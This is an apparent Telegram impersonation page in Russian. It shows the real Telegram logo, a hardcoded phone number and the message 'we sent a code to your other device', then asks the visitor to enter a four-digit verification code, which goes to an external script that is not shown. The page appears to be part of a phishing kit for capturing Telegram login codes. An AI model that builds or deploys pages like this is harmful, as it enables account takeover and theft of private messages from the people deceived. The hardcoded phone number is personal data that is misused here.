<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram - Подтверждение</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="telegram-logo">
                <!-- Настоящий логотип Telegram -->
                <svg viewBox="0 0 240 240" width="80" height="80" xmlns="http://www.w3.org/2000/svg">
                    <defs>
                        <linearGradient id="tg-grad" x1="120" y1="240" x2="120" gradientUnits="userSpaceOnUse">
                            <stop offset="0" stop-color="#1d93d2"/>
                            <stop offset="1" stop-color="#38b0e3"/>
                        </linearGradient>
                    </defs>
                    <circle cx="120" cy="120" r="120" fill="url(#tg-grad)"/>
                    <path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#c8daea"/>
                    <path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#a9c6d8"/>
                    <path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,120.106-45.36,120.106-45.36s3.208-1.081,5.1-.362a2.766,2.766,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043A8.13,8.13,0,0,1,146.1,172.5c-8.711-7.493-38.819-27.727-45.472-32.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#fff"/>
                </svg>
            </div>
            <h1>Telegram</h1>
            <div class="phone-number">
                <span id="displayPhone">+380 99 552 63 45</span>
                <a href="index.html" class="edit-link">✏️</a>
            </div>
            <p class="subtitle">Мы отправили код в приложение Telegram на вашем другом устройстве</p>
        </div>
        <div class="form-container">
            <form id="codeForm">
                <div class="form-group">
                    <label for="code">Код подтверждения</label>
                    <input type="text" id="code" name="code" placeholder="XXXX" required maxlength="4">
                </div>
                <button type="submit" class="btn-primary">Подтвердить</button>
            </form>
            <div class="resend-code">
                <a href="#" class="link">Отправить код повторно</a>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
